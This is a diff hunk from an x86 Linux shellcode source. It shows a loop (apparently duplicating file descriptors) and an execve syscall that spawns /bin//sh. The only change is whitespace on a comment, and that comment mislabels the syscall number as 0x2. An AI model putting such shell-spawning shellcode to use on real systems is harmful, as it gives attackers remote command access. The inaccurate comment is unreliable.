@@ -62,7 +62,7 @@ jns loop                           ;if SF not set ==> keep jumping
 xor ecx,ecx                        ;clear ECX
 push ecx                           ;Push NULL
 push byte 0x0b                     ;execve() sys call number
-pop eax 						               ;EAX=0x2 | execve()
+pop eax 						                     ;EAX=0x2 | execve()
 push 0x68732f2f                    ;(1)/bin//sh
 push 0x6e69622f                    ;(2)/bin//sh
 mov ebx,esp                        ;EBX pointing to “/bin//sh”
